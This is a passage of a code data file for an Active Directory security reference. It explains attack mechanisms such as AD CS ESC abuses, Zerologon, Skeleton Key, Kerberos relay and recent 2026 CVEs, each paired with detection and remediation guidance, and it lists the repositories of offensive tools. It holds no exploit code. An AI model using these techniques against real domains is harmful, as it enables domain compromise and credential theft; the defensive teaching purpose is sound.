    body: "The Certificate Request Agent EKU exists so that a designated 'agent' can enroll on behalf of other users (e.g. smart card issuance workflows). If a low-privileged principal can enroll in a template carrying this EKU, they become an agent and can then request certificates in any other user's name from a second template that permits agent-based enrollment.",
    effect: "Impersonate any user the second template allows enrollment on behalf of — often unrestricted.",
    detection: "Identify templates with the Certificate Request Agent EKU and check who can enroll in them, then check which other templates accept agent-signed requests.",
    remediation: "Restrict Enrollment Agent template access to a small, tightly controlled group, and restrict which templates accept agent-signed requests.",
  },
  {
    id: "esc4",
    category: "adcs",
    title: "ESC4 — Vulnerable template access control",
    why: "The template's own security, not just what it grants, matters.",
    body: "If a low-privileged principal has WriteOwner, WriteDacl, or GenericWrite over the certificate template object itself (not the resulting certificates — the template definition), they can simply reconfigure the template into an ESC1-exploitable shape and then run that attack.",
    effect: "Effectively grants the attacker the ability to create their own ESC1 condition on demand.",
    detection: "Audit ACLs on certificate template objects in AD, not just template settings — Certipy's `find` output flags writable templates directly.",
    remediation: "Restrict write access to certificate template objects to PKI administrators only.",
  },
  {
    id: "esc6",
    category: "adcs",
    title: "ESC6 — CA-wide SAN override (EDITF_ATTRIBUTESUBJECTALTNAME2)",
    why: "A single CA-level flag can undo per-template hardening entirely.",
    body: "If a CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled in its configuration, any certificate request against any template on that CA can include an attacker-chosen SAN — regardless of what each individual template's settings say. This effectively turns every enrollable template on the CA into an ESC1 condition.",
    effect: "Domain-wide impersonation capability from a single misconfigured CA setting, independent of template hardening.",
    detection: "Query the CA's registry policy configuration for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (Certipy's `find` surfaces this).",
    remediation: "Disable the flag; Microsoft's own guidance has recommended against enabling it for years.",
  },
  {
    id: "esc7",
    category: "adcs",
    title: "ESC7 — Vulnerable CA access control",
    why: "Rights over the CA itself bypass template-level restrictions entirely.",
    body: "Manage CA and Manage Certificates rights on the CA object let a principal approve pending certificate requests, re-enable disabled templates, or in some configurations modify CA behavior directly — sidestepping whatever restrictions exist at the template level.",
    effect: "Can re-enable a dangerous template that was previously disabled, or directly approve a request that would otherwise be denied.",
    detection: "Audit who holds Manage CA / Manage Certificates rights via `certutil -getreg` or Certipy's CA enumeration.",
    remediation: "Restrict CA management rights to a minimal, dedicated PKI admin group — treat it with the same sensitivity as Domain Admin.",
  },
  {
    id: "esc8",
    category: "adcs",
    title: "ESC8 — NTLM relay to HTTP web enrollment",
    why: "Turns a coercion primitive into a certificate, which is a much more durable credential than a relayed session alone.",
    body: "AD CS's optional Web Enrollment role accepts certificate requests over HTTP, which supports NTLM authentication — and HTTP endpoints can't enforce SMB-style signing. Combined with a coercion technique (PetitPotam, PrinterBug, etc.) that forces a machine account (often a DC) to authenticate to an attacker listener, the coerced NTLM authentication can be relayed straight into a certificate request as that machine.",
    effect: "A certificate for the coerced machine account — for a DC, this is equivalent to full domain compromise.",
    detection: "Monitor for anomalous authentication to CA web enrollment endpoints and for coercion-technique indicators (unexpected outbound auth from a DC).",
    remediation: "Disable Web Enrollment if unused, enforce Extended Protection for Authentication (EPA) on the CA's IIS site, or require HTTPS with channel binding.",
  },
  {
    id: "esc9-10",
    category: "adcs",
    title: "ESC9 & ESC10 — Weak certificate mapping",
    why: "Newer research showing that even 'properly configured' templates can be undermined by how certificates get mapped back to AD accounts.",
    body: "By default, certificates issued before a 2022+ patch didn't embed a security identifier extension binding the cert cryptographically to one specific account. ESC9 abuses templates where this security extension is explicitly disabled, combined with the ability to change a victim's userPrincipalName, so a certificate ends up mapping to a different, more privileged account than the one it was issued for. ESC10 covers the same underlying weak-mapping problem but via the StrongCertificateBindingEnforcement registry setting on domain controllers being left at a permissive default.",
    effect: "A certificate legitimately issued for a low-privilege account can end up authenticating as a different, higher-privilege one, due to how identity mapping — not the certificate request itself — is configured.",
    detection: "Check template settings for CT_FLAG_NO_SECURITY_EXTENSION and audit DC registry settings for StrongCertificateBindingEnforcement.",
    remediation: "Apply Microsoft's KB5014754 strong-mapping enforcement, keep the security extension enabled on templates, and avoid leaving weak-mapping compatibility modes on longer than a migration requires.",
  },
  {
    id: "esc11",
    category: "adcs",
    title: "ESC11 — NTLM relay to the RPC (ICPR) enrollment endpoint",
    why: "Shows ESC8's relay risk isn't fully solved by disabling HTTP web enrollment.",
    body: "Beyond the HTTP web enrollment endpoint, AD CS also exposes certificate enrollment over RPC (the ICertPassage / ICPR interface). If this RPC service doesn't enforce Extended Protection / channel binding, NTLM authentication coerced from a victim can be relayed into it just like the ESC8 HTTP relay, independent of whether web enrollment is enabled at all.",
    effect: "Same outcome as ESC8 — a certificate for the coerced account — via a different transport that's easy to overlook if defenders only hardened the HTTP path.",
    detection: "Check whether the CA's RPC interface enforces Extended Protection for Authentication (`IF_ENFORCEENCRYPTICERTREQUEST`-style settings) and monitor for coerced authentication indicators.",
    remediation: "Enforce Extended Protection on the CA's RPC interface as well as its HTTP one — hardening only one transport leaves the other exploitable.",
  },
  {
    id: "esc11plus",
    category: "adcs",
    title: "ESC11+ — Newer and emerging ADCS techniques",
    why: "ADCS research is active and ongoing; this category covers what's come after ESC11 without overclaiming specifics that are still evolving.",
    body: "Community research has continued to surface additional AD CS weaknesses beyond ESC11 — including CA host-level compromise paths (e.g. extracting a CA's private key from an HSM/registry when an attacker gets local access to the CA server itself) and certificate-template abuse via Issuance Policy OIDs linked to privileged group membership, where enrolling in an apparently low-risk template can implicitly grant group-linked privilege through policy mapping rather than through the certificate's identity fields at all.",
    effect: "The exact mechanism varies by technique, but the common thread is that ADCS's attack surface extends beyond the classic identity-in-SAN model — treat the CA host and template's issuance policies as part of the audit scope too, not just enrollment rights and EKUs.",
    detection: "Keep Certipy and BloodHound's ADCS collectors current, since detection logic for newer ESCs is still being added; review CA host security independent of AD-level permissions.",
    remediation: "Treat CA servers as Tier 0 infrastructure with the same hardening as domain controllers, and review issuance policy OID mappings alongside standard template audits.",
  },
  {
    id: "adcs-detection-remediation",
    category: "adcs",
    title: "AD CS — general detection & remediation checklist",
    why: "Cross-cutting controls that reduce exposure across every ESC at once, rather than chasing each one individually.",
    body: "Run `certipy find -vulnerable` (or the BloodHound ADCS collector) regularly, not just once — template and CA configuration drifts over time as new templates get added for legitimate business needs. Treat every CA server as Tier 0 infrastructure: same patching cadence, same restricted logon rights, same monitoring as a domain controller. Apply KB5014754 strong-certificate-mapping enforcement domain-wide once compatibility testing is done. Enable Extended Protection for Authentication on both the HTTP and RPC enrollment endpoints to close relay paths (ESC8/ESC11) in one move. Minimize who holds Manage CA / Manage Certificates / template-write rights, auditing them with the same rigor as Domain Admins group membership.",
    effect: "These controls don't require chasing each ESC individually — hardening the CA host, enrollment transport, and template ACLs closes most of the tree at once.",
  },

  // ---------------- Top-tier / second-tier gap fill ----------------

  {
    id: "zerologon-mechanism",
    category: "credaccess",
    title: "Zerologon (CVE-2020-1472) — why an empty IV breaks everything",
    why: "One of the most severe AD vulnerabilities ever disclosed — unauthenticated, and total.",
    body: "The Netlogon secure channel uses AES-CFB8 encryption, and Microsoft's implementation used an all-zero initialization vector (IV) instead of a random one. For a small fraction of encryption keys, encrypting an all-zero plaintext with an all-zero IV produces an all-zero ciphertext — a mathematical accident, not a backdoor. By repeatedly authenticating a spoofed 'client' with an all-zero challenge/credential (each attempt has roughly a 1-in-256 chance of hitting this condition), an attacker can eventually establish a spoofed Netlogon session with zero knowledge of any credential, and use it to call NetrServerPasswordSet2 to overwrite the DC's own machine account password with an empty string.",
    effect: "The DC's own computer account now has an empty password, which can be authenticated with directly to DCSync the entire domain — full compromise, unauthenticated, in seconds, against an unpatched DC.",
    detection: "Monitor for repeated Netlogon authentication attempts with zero/null credential material, and for NetrServerPasswordSet2 calls targeting a DC's own account — Microsoft's patch (August 2020) enforces secure RPC for Netlogon and closes the underlying flaw.",
    remediation: "Patch immediately if not already done — this vulnerability is years old and trivially weaponized. Enable enforcement mode for Netlogon secure RPC (on by default since the February 2021 update) to fully close the gap.",
  },
  {
    id: "privileged-groups-overview",
    category: "acl",
    title: "Beyond Domain Admins — the other built-in privileged groups",
    why: "BloodHound highlights AdminTo and group membership generally, but the specific superpowers of these built-in groups are easy to miss if you're only looking for 'Domain Admins.'",
    body: "Several built-in groups carry AD-specific rights that don't show up as an obvious 'admin' label but are just as dangerous. Backup Operators hold SeBackupPrivilege/SeRestorePrivilege — the ability to read or write any file regardless of its ACL, via the OS backup API, which bypasses normal file permission checks entirely. Account Operators can create, modify, and delete most non-protected user, group, and computer objects domain-wide. Server Operators can log on locally to domain controllers and modify the services running on them. Print Operators can log on locally to DCs and load printer drivers, which execute in kernel mode. DnsAdmins can point the DNS Server service (which usually runs on a DC) at an arbitrary plugin DLL.",
    effect: "Each of these translates to a different flavor of DC or domain compromise — file-level bypass, object manipulation, service hijacking, kernel code execution, or DLL loading respectively — none of which require Domain Admin membership to abuse.",
  },
  {
    id: "privexchange-mechanism",
    category: "credaccess",
    title: "Why PrivExchange works",
    why: "Shows how a completely separate product's install process can silently rewrite AD's own security posture.",
    body: "Installing Microsoft Exchange grants the Exchange Windows Permissions group — and by extension every Exchange server's own machine account — WriteDacl rights on the domain object itself, a long-standing default that predates modern least-privilege thinking. Separately, Exchange's push subscription feature can be abused to coerce the Exchange server into authenticating to an attacker-controlled listener over HTTP. Combining the two: coerce the Exchange server's own machine account to authenticate, relay that NTLM authentication to LDAP, and use the relayed session's WriteDacl rights to grant the attacker's account DCSync privileges.",
    effect: "Any mailbox-having low-privilege domain user can escalate to a full DCSync-capable identity, purely from Exchange being present in the environment — no direct interaction with Exchange's own security required at all.",
    detection: "Monitor for unexpected outbound HTTP authentication from Exchange server machine accounts, and audit WriteDacl grants on the domain object for anything beyond default Exchange service accounts.",
    remediation: "Apply Microsoft's guidance to remove the Exchange Windows Permissions group's WriteDacl right where it isn't needed (post-patch Exchange CUs address this), and require LDAP signing/channel binding to close the relay path.",
  },
  {
    id: "skeleton-key-mechanism",
    category: "credaccess",
    title: "How the Skeleton Key attack works",
    why: "A persistence technique that's genuinely hard to spot precisely because it doesn't disable anything.",
    body: "Mimikatz's skeleton key module patches the in-memory LSASS process on a domain controller, modifying the Kerberos/NTLM authentication logic so that it accepts a second, fixed 'master' password (mimikatz by default) for every domain account — in addition to, not instead of, each account's real password. The patch lives only in memory, so it's wiped on reboot, but persists across that DC's uptime otherwise.",
    effect: "An attacker can log in as literally any domain user using the master password, while every legitimate user continues authenticating normally with their real password — nothing about their day-to-day experience changes, so there's no natural signal that anything is wrong.",
    detection: "Requires DC-level EDR/memory-integrity monitoring capable of detecting LSASS patching in memory; the technique leaves no password-reset events, since no password is actually changed.",
    remediation: "Requires SYSTEM/Domain Admin-equivalent access on a DC to plant, so the real remediation is preventing that level of compromise in the first place — treat any confirmed DC compromise as grounds to reboot every DC (clearing the in-memory patch) as part of incident response.",
  },
  {
    id: "golden-gmsa-mechanism",
    category: "credaccess",
    title: "How Golden gMSA works",
    why: "Shows that gMSA passwords aren't really secrets stored per-account — they're deterministically computable from one shared root key.",
    body: "Group Managed Service Account passwords aren't randomly generated and stored; they're computed on demand by both the DC and authorized clients using the KDS (Key Distribution Service) root key plus the target gMSA's SID and a few other public attributes. Reading a gMSA's password via legitimate ReadGMSAPassword rights just means asking a DC to run that computation for you. If an attacker instead steals the KDS root key itself (which requires Domain Admin-equivalent access once), they can run that exact same computation themselves, entirely offline, for any gMSA, including ones that don't exist yet.",
    effect: "One KDS root key theft compromises every gMSA in the domain — past, present, and any created in the future — a far larger and more durable blast radius than compromising a single gMSA's read permissions.",
    detection: "Monitor access to the KDS root key container in AD (CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration); this is rarely accessed under normal operation.",
    remediation: "Since this requires prior high-privilege access to obtain, the real mitigation is standard Tier 0 hardening — but be aware that any confirmed high-privilege compromise means every gMSA should be considered compromised too, not just accounts with hashes actually dumped.",
  },
  {
    id: "wsus-mechanism",
    category: "credaccess",
    title: "Why unencrypted WSUS is a fleet-wide SYSTEM vulnerability",
    why: "A single misconfiguration (HTTP instead of HTTPS) turns routine patch management into a mass-compromise vector.",
    body: "Windows Server Update Services often runs over plain HTTP by default rather than HTTPS. WSUS updates aren't validated by TLS in that configuration, and while the update payloads themselves are supposed to be signed, older/incomplete implementations of the client-side verification made it possible to serve a malicious 'update' — actually just an arbitrary executable — to any client polling that WSUS server, as long as an attacker can intercept or redirect that HTTP traffic.",
    effect: "Every machine configured to pull updates from the compromised WSUS path executes the attacker's payload as SYSTEM the next time it checks for updates — a single MITM position can cascade into fleet-wide compromise.",
    detection: "Monitor for unexpected executables or updates originating from the internal WSUS server, and for ARP/DNS anomalies indicating a MITM position was established.",
    remediation: "Configure WSUS to use HTTPS (this is the actual fix — SSL wasn't the default for years, which is why this remains common), and ensure update signature validation is fully enforced client-side.",
  },
  {
    id: "sccm-mechanism",
    category: "credaccess",
    title: "Why SCCM/MECM is a growing AD attack surface",
    why: "SCCM sits at a privileged intersection of 'manages every endpoint' and 'often configured more loosely than AD itself,' making it an increasingly common real-world path.",
    body: "System Center Configuration Manager (now Microsoft Endpoint Configuration Manager) needs broad reach to manage software deployment across every domain-joined endpoint, and that reach comes with credentials — most notably the Network Access Account, used by clients to fetch content from distribution points, which is frequently over-privileged relative to what it actually needs. That credential is cached locally on every managed endpoint's WMI/policy store, readable by any local admin. Separately, PXE boot media (used for imaging new machines) is often 'protected' with a shared password that, once decrypted, reveals the same or similarly-scoped credentials.",
    effect: "Local admin on any single SCCM-managed workstation can often pivot straight to the Network Access Account's domain-level access — turning one compromised endpoint into a much broader foothold than that endpoint's own local admin would otherwise grant.",
    detection: "Monitor for unusual queries against SCCM's WMI namespaces and for NAA authentication from unexpected source hosts.",
    remediation: "Minimize what the Network Access Account can actually access (least privilege, same as any service account), and prefer client push installation accounts / Enhanced HTTP over NAA-based content retrieval where possible.",
  },
  {
    id: "diamond-sapphire-tickets",
    category: "kerberos",
    title: "Diamond and Sapphire tickets — evading golden-ticket detection",
    why: "Shows how detection logic built around one attack's specific fingerprint gets sidestepped by a variant that avoids that exact fingerprint.",
    body: "A golden ticket is built entirely offline and never touches a real KDC, which gives it a detectable signature: certain fields (like the ticket's PAC checksum construction, or timestamps) can look subtly different from a KDC-issued ticket if you know what to check for. A diamond ticket instead requests a real TGT from the KDC first — a completely normal, legitimate request — and then modifies specific fields (like group memberships) in that already-issued ticket using the krbtgt hash to re-sign it. A sapphire ticket refines this further by performing an S4U2self round-trip against the KDC to pull a fully legitimate PAC for the target identity before splicing it in, closing PAC-inconsistency gaps a diamond ticket can still leave behind.",
    effect: "Both produce a forged-privilege ticket that's much harder to distinguish from a real one than a classic golden ticket, since it genuinely originated from a real KDC exchange.",
    detection: "Requires comparing PAC contents against what the account's real AD group memberships should be, rather than relying on offline-forgery fingerprints alone — a harder detection problem than golden tickets.",
    remediation: "Same fundamental mitigation as golden tickets — protecting the krbtgt hash is what prevents all ticket-forging variants; rotating krbtgt (twice) invalidates all of them equally.",
  },
  {
    id: "kerberos-relay-mechanism",
    category: "kerberos",
    title: "Kerberos relay — why it's harder than NTLM relay, and when it isn't",
    why: "Kerberos relay looks like NTLM relay's cousin, but the AP-REQ can only be relayed to a service running under the exact identity it was requested for — the whole technique is about forcing that identity to line up with a target worth relaying to.",
    body: "An AP-REQ (the service-ticket-bearing message a client sends to authenticate) can be relayed exactly like an NTLM auth message, but only if neither side applies session signing or encryption — since the attacker never has the session key needed to fake those. Windows services also only check whether they can decrypt the ticket, not which service class (CIFS, HTTP, HOST...) it was issued for — so one account running several services under different SPN classes means a ticket for one class works against all of them. Because an AP-REQ can't be relayed to a different identity than the one requested, the attacker's real problem is forcing the client to build an AP-REQ for the intended relay target in the first place: via DNS SOA/TKEY poisoning (mitm6 + krbrelayx), a coerced authentication redirected through a spoofed ADIDNS record, or an LLMNR-poisoned answer name (Responder -N) that substitutes an arbitrary relay target's SPN.",
    effect: "Relaying to LDAP/LDAPS is effectively off the table by default (LDAP always sets up its own signing), which is the single biggest practical difference from NTLM relay — Kerberos relay's real value shows up specifically where NTLM is unavailable (disabled domain-wide) or the client is a member of Protected Users, or the target only accepts Kerberos (a hardened ADCS web enrollment endpoint being the most common real case).",
    detection: "Watch for DNS SOA/TKEY exchanges and ADIDNS record creation from unexpected sources, unusual Kerberos AP-REQ/AP-REP pairs targeting AD CS or SCCM HTTP endpoints, and LLMNR/mDNS/NBT-NS responses whose answer name doesn't match the original query name.",
    remediation: "Disable LLMNR/NBT-NS/mDNS where not needed (removes the multicast-poisoning entry point), restrict who can create ADIDNS records, enforce Extended Protection for Authentication on ADCS web enrollment and other HTTP-Kerberos endpoints, and disable IPv6 or deploy mitm6 detections if it isn't in active use.",
  },
  {
    id: "certifried-mechanism",
    category: "adcs",
    title: "Certifried (CVE-2022-26923) — machine account name spoofing",
    why: "Combines two assumptions that turned out to both be wrong at once: that MachineAccountQuota is low-risk, and that dNSHostName was validated.",
    body: "Any domain user can create up to a default of 10 computer accounts via MachineAccountQuota — normally considered low-risk since a fresh, empty computer account has minimal rights. Before the May 2022 patch, however, a user could also rewrite that computer's dNSHostName attribute to match an existing, unrelated computer's hostname — including a domain controller's — without any special rights, because AD didn't validate that the new value was actually unique or unclaimed. AD CS's default Machine certificate template builds the certificate's identity from exactly that dNSHostName field.",
    effect: "Requesting a certificate from the renamed computer account produces a certificate that authenticates as the real DC it was renamed to impersonate — full domain compromise starting from a standard, unprivileged user account.",
    detection: "Audit for certificate requests where the requesting computer's dNSHostName doesn't match its actual sAMAccountName-derived hostname, and monitor MachineAccountQuota usage for unusual patterns.",
    remediation: "Apply the May 2022 patch, which adds proper validation preventing this specific dNSHostName collision.",
  },

  // ---------------- Recent CVEs (2026) ----------------
  {
    id: "cve-2026-25177",
    category: "cve",
    title: "CVE-2026-25177 — AD DS SPN/UPN naming collision (CVSS 8.8)",
    why: "A network-reachable, low-privilege, no-user-interaction elevation of privilege sitting directly in AD DS itself — disclosed March 10, 2026, patched the same day.",
    body: "The public advisory describes this as improper restriction of names for files and other resources (CWE-641) in Active Directory Domain Services. Independent reporting and community tooling consistently point to the root cause involving Service Principal Names and User Principal Names — both of which are supposed to be strictly unique forest-wide, enforced by AD's duplicate-prevention checks. The reporting describes Unicode character injection (zero-width spaces, homoglyphs, BOM markers, and other visually-confusable characters) into SPN/UPN values as a way to bypass that uniqueness enforcement, causing the directory to accept a value that collides with an existing one without AD recognizing the collision. Microsoft's own advisory text is short and doesn't confirm the exact exploitation mechanics, so treat the Unicode-collision explanation as well-corroborated third-party analysis rather than vendor-confirmed root cause.",
    effect: "An authenticated low-privileged user with write-SPN rights (common — see the WriteSPN entry in Attack Paths) can potentially cause Kerberos ticket mis-issuance, associating a service ticket with the wrong account, which can translate into privilege escalation up to SYSTEM depending on which identity the collision targets.",
    detection: "Monitor Event ID 5136 (AD object modification) filtered to servicePrincipalName/userPrincipalName attribute changes, Events 4738/4742 (user/computer object changes), and Event ID 2974 (which specifically logs blocked duplicate SPN/UPN attempts, including the colliding value and the object that already holds it). Hunt for non-ASCII characters in SPN/UPN values — mixed-script or zero-width characters in identity-critical fields are a strong signal worth investigating even accounting for legitimate multilingual environments.",
    remediation: "Apply the March 2026 cumulative update to every domain controller (patched builds vary by OS — e.g. Server 2019/Windows 10 1809 at 10.0.17763.8511+, Server 2022 at 10.0.20348.4830+). Separately, audit who holds delegated 'Validated write to service principal name' rights — the CVE is most dangerous in environments where that right has spread more widely than anyone remembers granting it.",
  },
  {
    id: "cve-2026-24297",
    category: "cve",
    title: "CVE-2026-24297 — Windows Kerberos security feature bypass (race condition)",
    why: "A same-day neighbor to CVE-2026-25177 in the March 2026 Kerberos/authentication cluster — worth knowing about even though it's a narrower bug.",
    body: "This is a race condition (CWE-362, concurrent execution with improper synchronization) in the Windows Kerberos implementation. Unlike CVE-2026-25177, this is a security feature bypass rather than a direct elevation of privilege — Microsoft and researcher writeups describe it as landing during a narrow group-policy reapplication window, letting an attacker circumvent a Kerberos-enforced protection rather than gain new rights outright.",
    effect: "Impact is scoped to confidentiality and integrity (not availability) — a bypassed security control during that timing window, rather than a direct path to elevated privilege on its own. Its real danger is as a building block chained with something else, the same pattern seen with earlier Kerberos ticket-handling bugs.",
    detection: "No public exploit code or in-the-wild exploitation was reported at disclosure — prioritize patch verification over active hunting for this specific CVE, though general Kerberos ticket-anomaly monitoring remains worthwhile regardless.",
    remediation: "Apply the March 2026 security update across all domain controllers and Kerberos-relying infrastructure.",
  },
  {
    id: "cve-2026-25171",
    category: "cve",
    title: "CVE-2026-25171 — Windows Authentication Methods use-after-free EoP",
    why: "The third member of the March 2026 identity-plane cluster — a memory-safety bug rather than a logic bug, which is a different risk profile worth distinguishing.",
    body: "Classified as CWE-416 (Use After Free), this vulnerability sits in Windows' authentication subsystem code that processes credentials and security tokens. An attacker who already has some level of local access can trigger specific authentication sequences that cause the system to mismanage memory allocations for authentication structures, creating conditions for elevated-privilege code execution.",
    effect: "Local privilege escalation — an attacker with initial low-level access on a system can potentially reach full system control by exploiting the memory corruption during authentication processing.",
    detection: "Review authentication logs for unusual sequences preceding privilege changes; as a memory-safety bug, this is harder to detect via log analysis alone compared to the logic-based flaws in this cluster — patch verification matters more than log-based hunting here.",
    remediation: "Apply the March 2026 security update; enable Windows Defender Credential Guard where supported, and apply least-privilege principles to reduce the pool of accounts that could serve as the 'initial access' this bug requires to trigger.",
  },
  {
    id: "cve-2026-56155",
    category: "cve",
    title: "CVE-2026-56155 — AD FS Distributed Key Manager EoP (actively exploited)",
    why: "Currently the most operationally urgent AD-adjacent CVE of 2026 — confirmed exploited in the wild, added to CISA's Known Exploited Vulnerabilities catalog, and it targets the actual private keys behind federated identity trust.",
    body: "AD FS uses a Distributed Key Manager (DKM) container in Active Directory to store the symmetric keys that protect the private token-signing and token-encryption certificates AD FS uses to prove identity to every connected application, including cloud services like Microsoft 365. This vulnerability (CWE-1220, insufficient granularity of access control) means the permissions on that DKM container are broader than they should be — an authenticated attacker with local access to the AD FS server can exploit that overly-permissive ACL to reach administrator-level privileges on the box, and from there, the token-signing key material itself.",
    effect: "Administrator-level compromise of the AD FS server, and potential exposure of the token-signing/encryption keys — which means an attacker doesn't need to steal any individual user's password or defeat MFA at all; they can mint arbitrary trusted authentication tokens for any federated identity, valid across every application trusting that AD FS instance.",
    detection: "AD FS/Admin Event 1132 warns when the DKM container's ACL differs from the secure baseline — the check runs about a minute after the AD FS service starts and every 24 hours after. Review Events 1132 through 1134 on every AD FS server regardless of patch status, since a stolen signing key remains valid until explicitly rotated, meaning patching alone doesn't evict an attacker who got in before the patch.",
    remediation: "Apply the July 2026 cumulative update immediately (this was exploited as a zero-day, so treat any unpatched AD FS server as potentially already compromised, not just theoretically exposed). Review and remediate DKM ACL deviations from the secure baseline — Microsoft's default remediation (disabling inheritance, restricting to Domain Admins/Enterprise Admins/SYSTEM/the AD FS service account only) becomes default behavior starting with the October 2026 updates on Server 2016+, but should be verified manually now rather than waiting. Critically: rotate the token-signing and token-encryption certificates if there's any chance of prior compromise, since patching the ACL doesn't invalidate keys an attacker may have already extracted.",
  },
  {
    id: "cve-2025-58726-2026-26128",
    category: "cve",
    title: "CVE-2025-58726 / CVE-2026-26128 — Kerberos reflective relay via Unicode normalization",
    why: "Extends the NTLM reflective-relay (loopback authentication) bypass chain to Kerberos, by exploiting the fact that two different Windows components normalize Unicode lookalike characters inconsistently with each other.",
    body: "Registering a DNS record using Unicode lookalike characters (e.g. Ⓡ U+24C7 CIRCLED LATIN CAPITAL LETTER R in place of R, and ․ U+2024 ONE DOT LEADER in place of the dots) creates a hostname that the DC's LDAP search normalizes to the SAME sort key as the real target machine's SPN (via LCMapStringEx with case/width/nonspacing-mark-insensitive flags) — but that the DnsCache service does NOT recognize as loopback/localhost, because CompareStringW there only ignores case, not the other Unicode equivalences. That mismatch lets a coerced machine be tricked into requesting a Kerberos ticket for what it thinks is a distinct remote host, when the DC actually treats it as the same account — producing an AP-REQ relayable back to the originating machine via a modified krbrelayx.",
    effect: "A reflective (self-to-self) authentication relay entirely via Kerberos — the same class of impact as the earlier NTLM reflective-relay bypasses (SYSTEM-level shells on the coerced machine itself), just reaching it through Kerberos instead of NTLM.",
    detection: "Monitor for DNS record registrations containing non-ASCII/homoglyph characters in hostnames, and for Kerberos AP-REQ/AP-REP pairs where the requested SPN's hostname doesn't match any legitimately provisioned computer object.",
    remediation: "The March 2026 patch enforces SMB signing for loopback connections via the RequireSecuritySignatureForLoopback registry key, closing the primary SMB-based path — but services that don't enforce channel binding (ADCS Web Enrollment, SCCM AdminService, MSSQL) remain exposed even post-patch, so treat Extended Protection for Authentication / channel binding as the real fix for those specific services rather than relying on the SMB-focused patch alone.",
  },

  // ---------------- Tool source repositories ----------------
  {
    id: "tool-source-repos",
    category: "reference",
    title: "Where these scripts and tools actually live",
    why: "Every command in this reference calls a real, publicly maintained tool — worth knowing the source so you can check for updates, read the full option list, or verify a script hasn't been tampered with before running it.",
    body: "The primary repositories referenced throughout this platform: Impacket (all the .py scripts — secretsdump, dacledit, GetUserSPNs, and dozens more) at github.com/fortra/impacket. BloodHound CE at github.com/SpecterOps/BloodHound, with its collector SharpHound at github.com/SpecterOps/SharpHound. Rubeus at github.com/GhostPack/Rubeus, Certify (its ADCS counterpart) at github.com/GhostPack/Certify, and SharpDPAPI (DPAPI secret extraction) at github.com/GhostPack/SharpDPAPI — all three from the same GhostPack collection. Mimikatz at github.com/gentilkiwi/mimikatz. Certipy at github.com/ly4k/Certipy. bloodyAD at github.com/CravateRouge/bloodyAD. NetExec at github.com/Pennyw0rth/NetExec. Ligolo-ng at github.com/nicocha30/ligolo-ng. Kerbrute at github.com/ropnop/kerbrute. PetitPotam at github.com/topotam/PetitPotam, Coercer at github.com/p0dalirius/Coercer, DFSCoerce at github.com/Wh04m1001/DFSCoerce, and ShadowCoerce at github.com/ShutdownRepo/ShadowCoerce. GoldenGMSA at github.com/Semperis/GoldenGMSA. SharpSCCM at github.com/Mayyhem/SharpSCCM. PrintSpoofer at github.com/itm4n/PrintSpoofer, GodPotato at github.com/BeichenDream/GodPotato, and RemotePotato0 (the Cross-Session Activation technique) at github.com/antonioCoco/RemotePotato0 — the same author's RunasCs (execute-as-another-user without a full logon session) lives at github.com/antonioCoco/RunasCs. Inveigh (Windows-native LLMNR/NBNS/mDNS poisoning) at github.com/Kevin-Robertson/Inveigh. WinPEAS is part of PEASS-ng at github.com/carlospolop/PEASS-ng. GTFOBins itself lives at github.com/GTFOBins/GTFOBins.github.io.",
    effect: "Cloning or downloading straight from these repos (rather than a random reupload) is the difference between running a known, community-audited tool and running an unknown binary someone else modified — always worth the extra step, especially for anything that touches credentials.",
    links: [
      { label: "Impacket", url: "https://github.com/fortra/impacket" },
      { label: "BloodHound CE", url: "https://github.com/SpecterOps/BloodHound" },
      { label: "SharpHound", url: "https://github.com/SpecterOps/SharpHound" },
      { label: "Rubeus", url: "https://github.com/GhostPack/Rubeus" },
      { label: "Certify", url: "https://github.com/GhostPack/Certify" },
      { label: "Mimikatz", url: "https://github.com/gentilkiwi/mimikatz" },
      { label: "Certipy", url: "https://github.com/ly4k/Certipy" },
      { label: "bloodyAD", url: "https://github.com/CravateRouge/bloodyAD" },
      { label: "NetExec", url: "https://github.com/Pennyw0rth/NetExec" },
      { label: "Ligolo-ng", url: "https://github.com/nicocha30/ligolo-ng" },
      { label: "Kerbrute", url: "https://github.com/ropnop/kerbrute" },
      { label: "PetitPotam", url: "https://github.com/topotam/PetitPotam" },
      { label: "Coercer", url: "https://github.com/p0dalirius/Coercer" },
      { label: "DFSCoerce", url: "https://github.com/Wh04m1001/DFSCoerce" },
      { label: "ShadowCoerce", url: "https://github.com/ShutdownRepo/ShadowCoerce" },
      { label: "GoldenGMSA", url: "https://github.com/Semperis/GoldenGMSA" },
      { label: "SharpSCCM", url: "https://github.com/Mayyhem/SharpSCCM" },
      { label: "PrintSpoofer", url: "https://github.com/itm4n/PrintSpoofer" },
      { label: "GodPotato", url: "https://github.com/BeichenDream/GodPotato" },
      { label: "RemotePotato0", url: "https://github.com/antonioCoco/RemotePotato0" },
      { label: "RunasCs", url: "https://github.com/antonioCoco/RunasCs" },
      { label: "Inveigh", url: "https://github.com/Kevin-Robertson/Inveigh" },
      { label: "SharpDPAPI", url: "https://github.com/GhostPack/SharpDPAPI" },
      { label: "PEASS-ng (WinPEAS/LinPEAS)", url: "https://github.com/carlospolop/PEASS-ng" },
      { label: "GTFOBins", url: "https://github.com/GTFOBins/GTFOBins.github.io" },
    ],
  },

  // ---------------- Tiering model & defensive concepts ----------------

  {
    id: "tiering-model",
    category: "acl",
    title: "The tiering model — why some assets matter more than others",
    why: "This is the defensive framework BloodHound's whole 'high value' marking system is built on — understanding it explains why the Attack Paths tab keeps pointing at the same handful of targets.",
    body: "Microsoft's tiering model (part of its Enhanced Security Admin Environment guidance) splits an AD environment into three trust levels. Tier 0 is anything that can control the domain itself: domain controllers, the accounts that administer them (Domain Admins, Enterprise Admins), the krbtgt account, AdminSDHolder-protected accounts, Group Policy Objects linked at the domain or DC level, and the AD CS infrastructure. Tier 1 covers server administration — the accounts and systems that manage application/member servers, but not the domain itself. Tier 2 covers workstation and end-user administration. The core rule is that credentials from a lower tier should never be usable to control a higher tier — a helpdesk admin's Tier 2 credential logging into a Tier 0 domain controller is itself a violation, regardless of whether anything is actively exploited.",
    effect: "BloodHound's 'high value' / Tier Zero marking exists because compromising anything in that set is equivalent to compromising the domain — this is why every shortest-path query in this reference targets Tier Zero rather than treating all assets as equally worth reaching, and why a path that looks short and easy to a Tier Zero asset is a more urgent finding than a long, complex path to a low-value workstation.",
  },
  {
    id: "honeytokens",
    category: "credaccess",
